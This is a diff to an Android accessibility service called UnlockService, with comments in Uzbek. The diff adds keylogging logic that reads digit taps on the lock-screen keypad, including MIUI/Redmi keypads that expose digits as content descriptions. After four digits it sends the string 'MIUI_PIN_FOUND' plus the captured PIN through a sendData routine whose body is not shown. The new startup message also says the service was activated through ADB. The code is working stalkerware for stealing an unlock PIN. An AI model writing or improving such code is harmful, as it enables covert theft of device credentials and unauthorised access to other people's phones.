@@ -17,37 +17,55 @@ public class UnlockService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        sendData("Tizim_uyg'onib_ishga_tushdi!_PIN_kutilmoqda...");
+        sendData("Tizim_ADB_orqali_faollashtirildi!_PIN_kutilmoqda...");
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Faqat haqiqiy BOSISH (CLICK) hodisasini ushlaymiz
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+        int eventType = event.getEventType();
+
+        // 1. Agar ekran o'chib yongan bo'lsa, eski qoldiqlarni tozalash
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            pinBuffer.setLength(0);
+        }
+
+        // 2. Faqat haqiqiy CLICK va FOCUSED hodisalarini ushlash
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             long currentTime = System.currentTimeMillis();
-            // Bir marta bosilganda ikki marta ushlamaslik uchun 500ms kutamiz
-            if (currentTime - lastClickTime < 500) return;
-            
+            if (currentTime - lastClickTime < 300) return; // Juda tez-tez bosishdan himoya
+
             AccessibilityNodeInfo source = event.getSource();
             if (source != null) {
-                processNode(source);
+                String digit = findDigit(source);
+                if (digit != null) {
+                    pinBuffer.append(digit);
+                    lastClickTime = currentTime;
+                    
+                    if (pinBuffer.length() == 4) {
+                        sendData("MIUI_PIN_FOUND: " + pinBuffer.toString());
+                        pinBuffer.setLength(0); 
+                    }
+                }
                 source.recycle();
-                lastClickTime = currentTime;
             }
         }
     }
 
-    private void processNode(AccessibilityNodeInfo node) {
-        if (node == null) return;
+    private String findDigit(AccessibilityNodeInfo node) {
+        if (node == null) return null;
         
+        // Redmi klaviaturasi ba'zan 'text' o'rniga 'contentDescription' ishlatadi
         CharSequence text = node.getText();
+        CharSequence desc = node.getContentDescription();
+        
+        String val = null;
         if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
-            pinBuffer.append(text);
-            if (pinBuffer.length() == 4) {
-                sendData("Captured_PIN: " + pinBuffer.toString());
-                pinBuffer.setLength(0);
-            }
+            val = text.toString();
+        } else if (desc != null && desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
+            val = desc.toString();
         }
+        
+        return val;
     }
 
     private void sendData(final String msg) {
